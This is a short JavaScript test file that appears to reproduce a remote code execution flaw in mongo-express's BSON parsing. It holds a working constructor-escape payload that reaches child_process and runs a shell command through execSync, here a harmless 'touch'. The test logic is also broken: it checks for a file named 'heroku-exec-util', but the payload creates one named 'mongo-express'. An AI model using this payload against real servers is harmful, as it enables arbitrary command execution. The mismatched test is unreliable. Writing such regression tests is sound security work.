


//
test("Remote code execution in mongo-express", () => {
  const fs = require("fs");
  const bson = require("mongo-express/lib/bson");
  const path = "./heroku-exec-util";
  // const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  exploit =
  "this.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('touch mongo-express')";
  try {
    bson.toBSON(exploit);

  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
  //sleep.sleep(5);
});
